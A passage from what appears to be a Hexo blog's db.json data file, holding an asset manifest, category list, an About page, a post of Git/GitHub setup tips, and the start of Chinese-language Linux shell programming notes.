:"146e7c6cd85a1c5940c74945b1951f517884c59b","modified":1624080481367},{"_id":"public/js/activate-power-mode.js","hash":"a21f2119965860b613e17dbcb8a21c18a55b595f","modified":1624080481367},{"_id":"public/js/app.js","hash":"07e5dd2526eae95eb973eb1c7d8a43b5f8a4f8be","modified":1624080481367},{"_id":"public/js/clicklove.js","hash":"9e8e79d69ad8338761272f86fe5cad0ad5e503cc","modified":1624080481367},{"_id":"public/js/goTop.js","hash":"3b28b9333e474939e65271ac8a70b695143e803c","modified":1624080481367},{"_id":"public/js/local_search.js","hash":"37c1f96f7d8e02b147d2c07468af7e5442a94a4f","modified":1624080481367},{"_id":"public/js/ribbon.min.js","hash":"3c8e4d717ca107f3723def1795c8ed62a5f1a8d0","modified":1624080481367},{"_id":"public/js/snow.js","hash":"264295c67eaae8057380af993fc9f578c340afbd","modified":1624080481367},{"_id":"public/js/swiper.animate1.0.3.min.js","hash":"0e48f180ca2f18b787e4b7b6e55ee3b0c6067691","modified":1624080481367},{"_id":"public/js/wrapImage.js","hash":"ad2a3a09efb390265b99bbe2896cd899e57b1aef","modified":1624080481367},{"_id":"public/js/aos/aos.js","hash":"850ee2e5c9fba610840137c6c4e92b5abbc428fe","modified":1624080481367},{"_id":"public/js/aplayer/APlayer@1.10.1.min.css","hash":"07372a2ba507388d0fed166d761b1c2c2a659dce","modified":1624080481367},{"_id":"public/js/bubble/bubble.js","hash":"20abc5ae3bde679d933283d41a7762954f0b28d3","modified":1624080481367},{"_id":"public/js/bubble/homeBubble.js","hash":"a8635136621c8c54c04462932192a94f314942cb","modified":1624080481367},{"_id":"public/js/clipboard/clipboard.min.js","hash":"6371ec0a8e242395c7d4d008d2b98e472c9dcc52","modified":1624080481367},{"_id":"public/js/cursor/clicklove.js","hash":"9e8e79d69ad8338761272f86fe5cad0ad5e503cc","modified":1624080481367},{"_id":"public/js/cursor/explosion.min.js","hash":"ed2d0a5ad306a2745b7c8180b69e36b78d4b0698","modified":1624080481367},{"_id":"public/js/cursor/fireworks.js","hash":"6e1e9206549a6a1a4f5a8672a2dc5044a8f691bd","modified":1624080481367},{"_id":"public/js/cursor/text.js","hash":"a015017310e601f1e544cbc4b08c35b8e547c939","modified":1624080481367},{"_id":"public/js/danmu/barrager.css","hash":"3691efec6dd3d554b4a3dd20ef04836459f151a8","modified":1624080481367},{"_id":"public/js/danmu/jquery.barrager.js","hash":"305d6e93f3de102b5e1e9b1373821c849d8f54cb","modified":1624080481367},{"_id":"public/js/fancybox/jquery.fancybox.min.css","hash":"1be9b79be02a1cfc5d96c4a5e0feb8f472babd95","modified":1624080481367},{"_id":"public/js/header/index.js","hash":"792809031929e2ae4f1da05dabc604870b1b6ab7","modified":1624080481367},{"_id":"public/js/issues/index.js","hash":"2d1964fcdb8332a1c7d1a528050f75b11e4b5b78","modified":1624080481367},{"_id":"public/js/lazyload/lazyload@1.9.1.js","hash":"690e0f376661f4c8fc69177927768263968ecf89","modified":1624080481367},{"_id":"public/js/loaded/index.css","hash":"6ffc29024687d49fda0d474dd4a94fc706b8d7fc","modified":1624080481367},{"_id":"public/js/prism/prism-coy.min.css","hash":"fe1246de39c25eaa7ad1b0c997ee530dbdd39ad8","modified":1624080481367},{"_id":"public/js/prism/prism-dark.min.css","hash":"a3f604a19e9a46f83a2fde49dfb45782748957ca","modified":1624080481367},{"_id":"public/js/prism/prism-funky.min.css","hash":"0220f68ccda78c2b5d1109e58f3879674c93b587","modified":1624080481367},{"_id":"public/js/prism/prism-line-numbers.css","hash":"3b64b50b73729de943ec894c1d6f19115fa81624","modified":1624080481367},{"_id":"public/js/prism/prism-okaidia.min.css","hash":"50be6cc15d883ff3fa5d0885fed47241695a986c","modified":1624080481367},{"_id":"public/js/prism/prism-solarizedlight.min.css","hash":"927b757cd8030d12953b5c0fa6eed5de15dda8ad","modified":1624080481367},{"_id":"public/js/prism/prism-tomorrow.min.css","hash":"7b4247bc4d3b719afe5957779d0e5c8fb716c8ea","modified":1624080481367},{"_id":"public/js/prism/prism-twilight.min.css","hash":"ff4a6e3c4f1cb9bb59ec061656eacb750d238c15","modified":1624080481367},{"_id":"public/js/prism/prism.min.css","hash":"aa405e2bcb571595c822a80f5482454c1536fa52","modified":1624080481367},{"_id":"public/js/shareJs/font.css","hash":"9d909397e4e94f696b7dd90a16481b50cf170362","modified":1624080481367},{"_id":"public/js/shareJs/share.min.css","hash":"573c7dddb465efd5f5a9337bd50a1ed3f8e82cff","modified":1624080481367},{"_id":"public/js/tocbot/tocbot.css","hash":"15601837bf8557c2fd111e4450ed4c8495fd11a0","modified":1624080481367},{"_id":"public/js/tocbot/tocbot.min.js","hash":"98af336bfc6118bd6aaae5722491e212ab70b5d3","modified":1624080481367},{"_id":"public/js/vue-seamless-scroll/index.js","hash":"f2aaf3f9b1ab7362f7cc158e5360cb1d62a57172","modified":1624080481367},{"_id":"public/js/vue-typed-js/index.css","hash":"36a1d2f61d11ab328e349d6a523dd9dea2ec7ee1","modified":1624080481367},{"_id":"public/css/style.css","hash":"6278d009211189ea30319783ebaea224085629f4","modified":1624080481367},{"_id":"public/medias/categories.jpg","hash":"6fd5bd2172bbe414d4853399d7f8538e41b9573f","modified":1624080481367},{"_id":"public/medias/comment-bg.gif","hash":"ca30cad50a1e3c723f12c24db62aa9d9fbac4da4","modified":1624080481367},{"_id":"public/js/vue-awesome-swiper.js","hash":"b7a1ab21dfc58272009bfb5cb7ab87b79f5df573","modified":1624080481367},{"_id":"public/js/aos/aos.css","hash":"0557d37454b67f42f2cb101e57e5070fb1193570","modified":1624080481367},{"_id":"public/js/shareJs/social-share.min.js","hash":"efdfa6b695ac6f0dd04cd8153d3e3a1a1edd90c2","modified":1624080481367},{"_id":"public/js/vue-typed-js/index.js","hash":"0d80f25135de943ccdfdebec23275bd82712fae1","modified":1624080481367},{"_id":"public/medias/tagDetail.jpg","hash":"f6b3a4f16ac95ebdcfcc6ac107419c22ad12706f","modified":1624080481367},{"_id":"public/medias/about.jpg","hash":"24c7657d2a6830d5238daf2b917f71a9545e95ef","modified":1624080481367},{"_id":"public/medias/tag.jpg","hash":"1d9ca36570c4c9545c06eac243c9513214a56d72","modified":1624080481367},{"_id":"public/css/animate.min.css","hash":"8411c1c0418521c96d07bcca0d9dbce7e832ccc9","modified":1624080481367},{"_id":"public/js/sakura.js","hash":"9e196ab241799126e6a2dd23ee1708b1505ccbf0","modified":1624080481367},{"_id":"public/js/fancybox/jquery.fancybox.min.js","hash":"6181412e73966696d08e1e5b1243a572d0f22ba6","modified":1624080481367},{"_id":"public/js/jquery3.5.1.js","hash":"d2cc8d43ce1c854b1172e42b1209502ad563db83","modified":1624080481367},{"_id":"public/js/swiper.min.js","hash":"a2fe3c0df9196597c283b2f6ffecc1d4d8702245","modified":1624080481367},{"_id":"public/js/valine/av-min@3.0.4.js","hash":"6d7100ab357ac92291901dbbf0d4c683d05a7672","modified":1624080481367},{"_id":"public/js/my404/bodymovin.js","hash":"0101a4545f219753bb617e9f1794444694b3e7d0","modified":1624080481367},{"_id":"public/js/my404/data.js","hash":"a9ba4005f96055774d3ff6977bd420d46da42da7","modified":1624080481367},{"_id":"public/js/vue2.6.11.js","hash":"e793aa33ef33150eaba3bc02b07455a231f053ad","modified":1624080481367},{"_id":"public/js/twikoo/twikoo.all.min.js","hash":"c3f5f0a69b7864e7ef5bbf99fc774bec37947d7c","modified":1624080481367}],"Category":[{"name":"Git","_id":"ckq3bl41v0004dsvt3xh38x3p"},{"name":"Linux","_id":"ckq3bl421000bdsvt5iow770y"},{"name":"linux","_id":"ckq3bl424000hdsvt7x236d8n"},{"name":"Markdown","_id":"ckq3bl42g000odsvt605lewxo"},{"name":"Web前端","_id":"ckq3bl42m000zdsvt7uqfc97v"},{"name":"hexo","_id":"ckq3bl42p0017dsvt4ptrhk5z"},{"name":"python","_id":"ckq3bl42s001ddsvt9cij410b"},{"name":"网络安全","_id":"ckq3bl42w001hdsvtd2m3fsan"},{"name":"blog","_id":"ckq3bl42x001ldsvt6psc3t5c"},{"name":"数据库","_id":"ckq3bl42y001pdsvt8xjphl2e"},{"name":"网络协议","_id":"ckq3bl42z001udsvtbhhi0jtp"},{"name":"爬虫","_id":"ckq3bl43w002cdsvt2r1ohhbm"},{"name":"python","parent":"ckq3bl43w002cdsvt2r1ohhbm","_id":"ckq3bl43x002fdsvt2awj7jkp"}],"Data":[],"Page":[{"title":"About me","_content":"# 联系方式\nQQ: 2296557984\nGithub: github.com/mxrmiss\n邮箱：heroli520@outlook.com\n\n\n## 博客声明\n\n- 本人博客中的部分文章及图片内容来源于网络，如有侵权，请及时与本人联系删除所侵权内容\n- 转载时应注明出处\n- 本博客内容均只供学术交流，请不要利用本博客触犯法律法规，本博主将不承担任何法律责任\n- 感谢本博客主题提供者\n - [主题链接点此处](https://github.com/markyong/hexo-theme-stage)","source":"about/index.md","raw":"title: \"About me\"\n---\n# 联系方式\nQQ: 2296557984\nGithub: github.com/mxrmiss\n邮箱：heroli520@outlook.com\n\n\n## 博客声明\n\n- 本人博客中的部分文章及图片内容来源于网络，如有侵权，请及时与本人联系删除所侵权内容\n- 转载时应注明出处\n- 本博客内容均只供学术交流，请不要利用本博客触犯法律法规，本博主将不承担任何法律责任\n- 感谢本博客主题提供者\n - [主题链接点此处](https://github.com/markyong/hexo-theme-stage)","date":"2021-03-24T04:15:04.147Z","updated":"2021-03-24T04:15:04.147Z","path":"about/index.html","comments":1,"layout":"page","_id":"ckq3bl41l0000dsvtdorx1aes","content":"<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><p>QQ: 2296557984<br>Github: github.com/mxrmiss<br>邮箱：<a href=\"mailto:heroli520@outlook.com\">heroli520@outlook.com</a></p>\n<h2 id=\"博客声明\"><a href=\"#博客声明\" class=\"headerlink\" title=\"博客声明\"></a>博客声明</h2><ul>\n<li>本人博客中的部分文章及图片内容来源于网络，如有侵权，请及时与本人联系删除所侵权内容</li>\n<li>转载时应注明出处</li>\n<li>本博客内容均只供学术交流，请不要利用本博客触犯法律法规，本博主将不承担任何法律责任</li>\n<li>感谢本博客主题提供者<ul>\n<li><a href=\"https://github.com/markyong/hexo-theme-stage\">主题链接点此处</a></li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h1><p>QQ: 2296557984<br>Github: github.com/mxrmiss<br>邮箱：<a href=\"mailto:heroli520@outlook.com\">heroli520@outlook.com</a></p>\n<h2 id=\"博客声明\"><a href=\"#博客声明\" class=\"headerlink\" title=\"博客声明\"></a>博客声明</h2><ul>\n<li>本人博客中的部分文章及图片内容来源于网络，如有侵权，请及时与本人联系删除所侵权内容</li>\n<li>转载时应注明出处</li>\n<li>本博客内容均只供学术交流，请不要利用本博客触犯法律法规，本博主将不承担任何法律责任</li>\n<li>感谢本博客主题提供者<ul>\n<li><a href=\"https://github.com/markyong/hexo-theme-stage\">主题链接点此处</a></li>\n</ul>\n</li>\n</ul>\n"},{"title":"categories","type":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ntype: \"categories\"\nlayout: \"categories\"\n---","date":"2021-03-24T04:15:04.865Z","updated":"2021-03-24T04:15:04.865Z","path":"categories/index.html","comments":1,"_id":"ckq3bl41s0002dsvtfacqfu63","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Gallery","albums":[["img_url","img_caption"],["img_url","img_caption"]],"_content":"","source":"photos/index.md","raw":"---\ntitle: Gallery\n\nalbums: [\n        [\"img_url\",\"img_caption\"],\n        [\"img_url\",\"img_caption\"]\n        ]\n---","date":"2021-03-24T04:15:04.458Z","updated":"2021-03-24T04:15:04.458Z","path":"photos/index.html","comments":1,"layout":"page","_id":"ckq3bl41x0006dsvth2310wta","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Tags","layout":"tags","type":"tags","_content":"","source":"tags/index.md","raw":"title: \"Tags\"\nlayout: \"tags\"\ntype: \"tags\"\n---","date":"2021-03-24T04:15:04.306Z","updated":"2021-03-24T04:15:04.306Z","path":"tags/index.html","comments":1,"_id":"ckq3bl41z0008dsvtfw10f4kq","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Git & Github","date":"2020-05-03T01:08:28.000Z","comments":1,"_content":"\n# Git & Github\n\n\n\n- Git 初始化\n\n  ```\n  # 设置github昵称\n  git config --global user.name 'mxrmiss'\n  # 设置github邮箱\n  git config --global user.email 'heroli520@outlook.com'\n  ```\n\n- git status 无法显示中文\n\n  ```\n  git config --global core.quotepath false\n  ```\n  <!--more-->\n\n- git 无法推送新文件到github仓库原因\n\n  1. 可能仓库内已经有东西了，而且使用的推送命令不对\n  2. 或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的\n  3. 强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失\n\n- 查看git简单配置\n\n  ```\n  git config --list\n  ```\n\n- 是git无密向github传输文件\n\n  1. 终端输入ssh-keygen, 之后不断按回车\n  2. 会产生一对公密和私密，存储在家目录下的 .ssh 目录中\n  3. cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存\n  4. ssh -T git@github.com #打开git bash输入此命令，显示successful表示成功\n  5. 以后clone仓库地址时就可以直接使用\n  \n- 向仓库更新文件基本命令\n\n```\ngit status\ngit add *\ngit commit -m \"内容描述\"\ngit push\n```\n\n\n\n- 无法读取远程仓库\n\n  删除blog文件夹下的隐藏文件 .deploy_git\n\n```\nfatal: 无法读取远程仓库。\n\n请确认您有正确的访问权限并且仓库存在。\n```","source":"_posts/Git.md","raw":"---\ntitle: Git & Github\ndate: 2020/5/3 9:08:28\ncomments: ture\ncategories:\n- Git\ntags:\n- Git\n---\n\n# Git & Github\n\n\n\n- Git 初始化\n\n  ```\n  # 设置github昵称\n  git config --global user.name 'mxrmiss'\n  # 设置github邮箱\n  git config --global user.email 'heroli520@outlook.com'\n  ```\n\n- git status 无法显示中文\n\n  ```\n  git config --global core.quotepath false\n  ```\n  <!--more-->\n\n- git 无法推送新文件到github仓库原因\n\n  1. 可能仓库内已经有东西了，而且使用的推送命令不对\n  2. 或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的\n  3. 强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失\n\n- 查看git简单配置\n\n  ```\n  git config --list\n  ```\n\n- 是git无密向github传输文件\n\n  1. 终端输入ssh-keygen, 之后不断按回车\n  2. 会产生一对公密和私密，存储在家目录下的 .ssh 目录中\n  3. cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存\n  4. ssh -T git@github.com #打开git bash输入此命令，显示successful表示成功\n  5. 以后clone仓库地址时就可以直接使用\n  \n- 向仓库更新文件基本命令\n\n```\ngit status\ngit add *\ngit commit -m \"内容描述\"\ngit push\n```\n\n\n\n- 无法读取远程仓库\n\n  删除blog文件夹下的隐藏文件 .deploy_git\n\n```\nfatal: 无法读取远程仓库。\n\n请确认您有正确的访问权限并且仓库存在。\n```","slug":"Git","published":1,"updated":"2021-03-24T04:15:03.587Z","layout":"post","photos":[],"link":"","_id":"ckq3bl41p0001dsvtfjmq6tgm","content":"<h1 id=\"Git-amp-Github\"><a href=\"#Git-amp-Github\" class=\"headerlink\" title=\"Git &amp; Github\"></a>Git &amp; Github</h1><ul>\n<li><p>Git 初始化</p>\n<pre><code># 设置github昵称\ngit config --global user.name &#39;mxrmiss&#39;\n# 设置github邮箱\ngit config --global user.email &#39;heroli520@outlook.com&#39;</code></pre></li>\n<li><p>git status 无法显示中文</p>\n<pre><code>git config --global core.quotepath false</code></pre><span id=\"more\"></span>\n</li>\n<li><p>git 无法推送新文件到github仓库原因</p>\n<ol>\n<li>可能仓库内已经有东西了，而且使用的推送命令不对</li>\n<li>或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的</li>\n<li>强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失</li>\n</ol>\n</li>\n<li><p>查看git简单配置</p>\n<pre><code>git config --list</code></pre></li>\n<li><p>是git无密向github传输文件</p>\n<ol>\n<li>终端输入ssh-keygen, 之后不断按回车</li>\n<li>会产生一对公密和私密，存储在家目录下的 .ssh 目录中</li>\n<li>cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存</li>\n<li>ssh -T <a href=\"mailto:git@github.com\">git@github.com</a> #打开git bash输入此命令，显示successful表示成功</li>\n<li>以后clone仓库地址时就可以直接使用</li>\n</ol>\n</li>\n<li><p>向仓库更新文件基本命令</p>\n</li>\n</ul>\n<pre><code>git status\ngit add *\ngit commit -m &quot;内容描述&quot;\ngit push</code></pre><ul>\n<li><p>无法读取远程仓库</p>\n<p>删除blog文件夹下的隐藏文件 .deploy_git</p>\n</li>\n</ul>\n<pre><code>fatal: 无法读取远程仓库。\n\n请确认您有正确的访问权限并且仓库存在。</code></pre>","site":{"data":{}},"excerpt":"<h1 id=\"Git-amp-Github\"><a href=\"#Git-amp-Github\" class=\"headerlink\" title=\"Git &amp; Github\"></a>Git &amp; Github</h1><ul>\n<li><p>Git 初始化</p>\n<pre><code># 设置github昵称\ngit config --global user.name &#39;mxrmiss&#39;\n# 设置github邮箱\ngit config --global user.email &#39;heroli520@outlook.com&#39;</code></pre></li>\n<li><p>git status 无法显示中文</p>\n<pre><code>git config --global core.quotepath false</code></pre>","more":"</li>\n<li><p>git 无法推送新文件到github仓库原因</p>\n<ol>\n<li>可能仓库内已经有东西了，而且使用的推送命令不对</li>\n<li>或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的</li>\n<li>强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失</li>\n</ol>\n</li>\n<li><p>查看git简单配置</p>\n<pre><code>git config --list</code></pre></li>\n<li><p>是git无密向github传输文件</p>\n<ol>\n<li>终端输入ssh-keygen, 之后不断按回车</li>\n<li>会产生一对公密和私密，存储在家目录下的 .ssh 目录中</li>\n<li>cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存</li>\n<li>ssh -T <a href=\"mailto:git@github.com\">git@github.com</a> #打开git bash输入此命令，显示successful表示成功</li>\n<li>以后clone仓库地址时就可以直接使用</li>\n</ol>\n</li>\n<li><p>向仓库更新文件基本命令</p>\n</li>\n</ul>\n<pre><code>git status\ngit add *\ngit commit -m &quot;内容描述&quot;\ngit push</code></pre><ul>\n<li><p>无法读取远程仓库</p>\n<p>删除blog文件夹下的隐藏文件 .deploy_git</p>\n</li>\n</ul>\n<pre><code>fatal: 无法读取远程仓库。\n\n请确认您有正确的访问权限并且仓库存在。</code></pre>"},{"title":"Linux高级","_content":"\n\n\n# Linux 高级程序设计\n\n- [笔记参考视频链接](https://www.bilibili.com/video/BV1Mk4y1z7Tw/?p=4)\n- 注：此笔记参考了视频教程中的内容，以及部分资料，仅供学习参考\n\n\n\n## 一、shell编程\n\n### 1.1概述\n\n#### 1.1.1 shell作为应用程序\n\n<!--more-->\n\n- 交互式地解释、执行用户输入的命令,将用户的操作翻译成机器可以识别的语言,完成相应功能称之为shell命令解析器 ，shell是用户和Linux内核之间的接口程序。 用户在提示符下输入的命令都由shell先解释，然后传给Linux核心。\n-  它调用了系统核心的大部分功能来执行程序、并以并行的方式协调各个程序的运行 。Linux系统中提供了好几种不同的shell命令解释器,如sh、ash、bash等。一般默认使用bash作为默认的解释器。我们后面编写的shell脚本,都是由上述shell命令解释器解释执行的。\n\n![image-20200607170442735](/home/blacksheep/.config/Typora/typora-user-images/image-20200607170442735.png)\n\n![image-20200607170727415](/home/blacksheep/.config/Typora/typora-user-images/image-20200607170727415.png)\n\n#### 1.1.2 shell作为程序设计语言\n\n- 简称shell脚本，用任意文本编译器添加内容，再授予权限即可使用，与一些编程语言相类似\n- /etc/profile 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,系统的公共环境变量在这里设置 ，开始自启动的程序,一般也在这里设置\n-  ~/.bashrc用户自己的家目录中的.bashrc 登录时会自动调用,打开任意终端时也会自动调用。这个文件一般设置与个人用户有关的环境变量,如交叉编译器的路径等等\n- 用户编写,需要手动调用的 例如我们上面编写的脚本都属于此类 无论是系统调用的还是需要我们自己调用的,其语法规则都一样\n\n### 1.2 shell语法\n\n#### 1.2.1 脚本的定义与执行\n\n1. 定义以开头:#!/bin/sh #!用来声明脚本由什么shell解释,否则使用默认shell\n2. 单个\"#\"号代表注释当前行\n3. 执行: chmod + x test.sh ./test.sh 增加可执行权限后执行 \n4. bash test.sh 直接指定使用bash解释test.sh \n5.  .  test.sh(source test.sh) 使用当前shell读取解释test.sh\n6. 脚本的书写不能包含空格\n\n#### 1.2.2 变量\n\n1. 自定义变量\n定义变量 变量名=变量值 如:num=10 \n\n2. 引用变量 $变量名\n    如:i=$num 把变量num的值付给变量i \n\n3. 显示变量 使用echo命令可以显示单个变量取值 echo\n    $num \n\n4. 清除变量 使用unset命令清除变量 unset varname\n\n5. 变量的其它用法: read string 从键盘输入一个字符串付给变量\n\n6. string readonly var=100 定义一个只读变量,只能在定义时初始化,以后不能改变,不能被清除。 \n\n7. export var=300 使用export说明的变量,会被导出为环境变量,其它shell均可使用 注意:此时必须使用source 2_var.sh才可以生效\n\n8. 注意事项:\n\n  1. 变量名只能包含英文字母下划线,不能以数字开头 1_num=10 错误 num_1=20 正确\n\n  2. 等号两边不能直接接空格符,若变量中本身就包含了空格,则整个字符串都要用双引号、或单引号括起来;双引号内的特殊字符可以保有变量特性,但是单引号内的特殊字符则仅为一般字符。name=aa bb //错误 name=\"aa bb\" //正确 echo \"$name is me\" //输出:aa bb is me echo'$name is me' //输出:$name is me 例2: 2_var.sh\n\n#### 1.2.3 环境变量（类似全局变量）\n\n1. shell在开始执行时就已经定义了一些和系统的工作环境有关的变量，我们可以在shell中直接使用$name引用\n2. 定义：一般在~/bashrc或/etc/profile文件中（系统自动调用的脚本）使用export设置，允许用户后来修改\n3. 设置环境变量：\n\n- 临时设置：使用export命令\n- 永久设置：需要在配置文件（~/bashrc或/etc/profile文件）中进行设置即可，设置完毕后需要通过source命令配置文件立即生效\n\n4. 预设变量：\n\n```\n$#:传给shell脚本参数的数量 \n$*:传给shell脚本参数的内容 $1、$2、$3、...、$9:运行脚本时传递给其的参数,用空格隔开\n$?:命令执行后返回的状态 \"$?\"用于检查上一个命令执行是否正确(在Linux中,命令退出状态为0表示该命令正确执行,任何非0值表示命令出错)。\n$0:当前执行的进程名 $$:当前进程的进程号 \n\"$$\"变量最常见的用途是用作临时文件的名字以保证临时文件不会重复\n\n```\n\n5. 符号的特殊用法：\n\n- 双引号里的变量会被引用解释\n- 单引号里的字符会被直接当成字符串使用\n- 反引号：获取一个shell命令的输出结果，或者将该结果赋予一个变量再去使用，单引号的使用必须在双引号内才会被解释，不能放在单引号内\n- 转义符使用时必须在echo后面加-e\n\n```\necho -e \"this \\n is \\n an apple\"\n```\n\n- 小括号：里面的内容由子shell完成，不影响不影响当前shell中的变量\n- 大括号：在当前shell中执行会影响当前变量\n\n\n\n#### 1.2.4 条件测试语句\n\n1. 为什么要测试？相当于代码中的局部调试\n\n2. test命令：用于测试字符串、文件状态和数字\n\n3. test命令的俩种形式：\n\n   ​\t\t\ttest或 [ condition ]  //方括号中的条件俩边必须要加空格\n\n4. ","source":"_posts/Linux 高级程序设计.md","raw":"---\ntitle: Linux高级\ntag: \n- [Linux]\ncategories:\n- Linux\n---\n\n\n\n# Linux 高级程序设计\n\n- [笔记参考视频链接](https://www.bilibili.com/video/BV1Mk4y1z7Tw/?p=4)\n- 注：此笔记参考了视频教程中的内容，以及部分资料，仅供学习参考\n\n\n\n## 一、shell编程\n\n### 1.1概述\n\n#### 1.1.1 shell作为应用程序\n\n<!--more-->\n\n- 交互式地解释、执行用户输入的命令,将用户的操作翻译成机器可以识别的语言,完成相应功能称之为shell命令解析器 ，shell是用户和Linux内核之间的接口程序。 用户在提示符下输入的命令都由shell先解释，然后传给Linux核心。\n-  它调用了系统核心的大部分功能来执行程序、并以并行的方式协调各个程序的运行 。Linux系统中提供了好几种不同的shell命令解释器,如sh、ash、bash等。一般默认使用bash作为默认的解释器。我们后面编写的shell脚本,都是由上述shell命令解释器解释执行的。\n\n![image-20200607170442735](/home/blacksheep/.config/Typora/typora-user-images/image-20200607170442735.png)\n\n![image-20200607170727415](/home/blacksheep/.config/Typora/typora-user-images/image-20200607170727415.png)\n\n#### 1.1.2 shell作为程序设计语言\n\n- 简称shell脚本，用任意文本编译器添加内容，再授予权限即可使用，与一些编程语言相类似\n- /etc/profile 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,系统的公共环境变量在这里设置 ，开始自启动的程序,一般也在这里设置\n-  ~/.bashrc用户自己的家目录中的.bashrc 登录时会自动调用,打开任意终端时也会自动调用。这个文件一般设置与个人用户有关的环境变量,如交叉编译器的路径等等\n- 用户编写,需要手动调用的 例如我们上面编写的脚本都属于此类 无论是系统调用的还是需要我们自己调用的,其语法规则都一样\n\n### 1.2 shell语法\n\n#### 1.2.1 脚本的定义与执行\n\n1. 定义以开头:#!/bin/sh #!用来声明脚本由什么shell解释,否则使用默认shell\n2. 单个\"#\"号代表注释当前行\n3. 执行: chmod + x test.sh ./test.sh 增加可执行权限后执行 \n4. bash test.sh 直接指定使用bash解释test.sh \n5.  .  test.sh(source test.sh) 使用当前shell读取解释test.sh\n6. 脚本的书写不能包含空格\n\n#### 1.2.2 变量\n\n1. 自定义变量\n定义变量 变量名=变量值 如:num=10 \n\n2. 引用变量 $变量名\n    如:i=$num 把变量num的值付给变量i \n\n3. 显示变量 使用echo命令可以显示单个变量取值 echo\n    $num \n\n4. 清除变量 使用unset命令清除变量 unset varname\n\n5. 变量的其它用法: read string 从键盘输入一个字符串付给变量\n\n6. string readonly var=100 定义一个只读变量,只能在定义时初始化,以后不能改变,不能被清除。 \n\n7. export var=300 使用export说明的变量,会被导出为环境变量,其它shell均可使用 注意:此时必须使用source 2_var.sh才可以生效\n\n8. 注意事项:\n\n  1. 变量名只能包含英文字母下划线,不能以数字开头 1_num=10 错误 num_1=20 正确\n\n  2. 等号两边不能直接接空格符,若变量中本身就包含了空格,则整个字符串都要用双引号、或单引号括起来;双引号内的特殊字符可以保有变量特性,但是单引号内的特殊字符则仅为一般字符。name=aa bb //错误 name=\"aa bb\" //正确 echo \"$name is me\" //输出:aa bb is me echo'$name is me' //输出:$name is me 例2: 2_var.sh\n\n#### 1.2.3 环境变量（类似全局变量）\n\n1. shell在开始执行时就已经定义了一些和系统的工作环境有关的变量，我们可以在shell中直接使用$name引用\n2. 定义：一般在~/bashrc或/etc/profile文件中（系统自动调用的脚本）使用export设置，允许用户后来修改\n3. 设置环境变量：\n\n- 临时设置：使用export命令\n- 永久设置：需要在配置文件（~/bashrc或/etc/profile文件）中进行设置即可，设置完毕后需要通过source命令配置文件立即生效\n\n4. 预设变量：\n\n```\n$#:传给shell脚本参数的数量 \n$*:传给shell脚本参数的内容 $1、$2、$3、...、$9:运行脚本时传递给其的参数,用空格隔开\n$?:命令执行后返回的状态 \"$?\"用于检查上一个命令执行是否正确(在Linux中,命令退出状态为0表示该命令正确执行,任何非0值表示命令出错)。\n$0:当前执行的进程名 $$:当前进程的进程号 \n\"$$\"变量最常见的用途是用作临时文件的名字以保证临时文件不会重复\n\n```\n\n5. 符号的特殊用法：\n\n- 双引号里的变量会被引用解释\n- 单引号里的字符会被直接当成字符串使用\n- 反引号：获取一个shell命令的输出结果，或者将该结果赋予一个变量再去使用，单引号的使用必须在双引号内才会被解释，不能放在单引号内\n- 转义符使用时必须在echo后面加-e\n\n```\necho -e \"this \\n is \\n an apple\"\n```\n\n- 小括号：里面的内容由子shell完成，不影响不影响当前shell中的变量\n- 大括号：在当前shell中执行会影响当前变量\n\n\n\n#### 1.2.4 条件测试语句\n\n1. 为什么要测试？相当于代码中的局部调试\n\n2. test命令：用于测试字符串、文件状态和数字\n\n3. test命令的俩种形式：\n\n   ​\t\t\ttest或 [ condition ]  //方括号中的条件俩边必须要加空格\n\n4. ","slug":"Linux 高级程序设计","published":1,"date":"2021-03-24T04:15:01.983Z","updated":"2021-03-24T04:15:02.101Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq3bl41t0003dsvtaj3heby2","content":"<h1 id=\"Linux-高级程序设计\"><a href=\"#Linux-高级程序设计\" class=\"headerlink\" title=\"Linux 高级程序设计\"></a>Linux 高级程序设计</h1><ul>\n<li><a href=\"https://www.bilibili.com/video/BV1Mk4y1z7Tw/?p=4\">笔记参考视频链接</a></li>\n<li>注：此笔记参考了视频教程中的内容，以及部分资料，仅供学习参考</li>\n</ul>\n<h2 id=\"一、shell编程\"><a href=\"#一、shell编程\" class=\"headerlink\" title=\"一、shell编程\"></a>一、shell编程</h2><h3 id=\"1-1概述\"><a href=\"#1-1概述\" class=\"headerlink\" title=\"1.1概述\"></a>1.1概述</h3><h4 id=\"1-1-1-shell作为应用程序\"><a href=\"#1-1-1-shell作为应用程序\" class=\"headerlink\" title=\"1.1.1 shell作为应用程序\"></a>1.1.1 shell作为应用程序</h4><span id=\"more\"></span>\n\n<ul>\n<li>交互式地解释、执行用户输入的命令,将用户的操作翻译成机器可以识别的语言,完成相应功能称之为shell命令解析器 ，shell是用户和Linux内核之间的接口程序。 用户在提示符下输入的命令都由shell先解释，然后传给Linux核心。</li>\n<li>它调用了系统核心的大部分功能来执行程序、并以并行的方式协调各个程序的运行 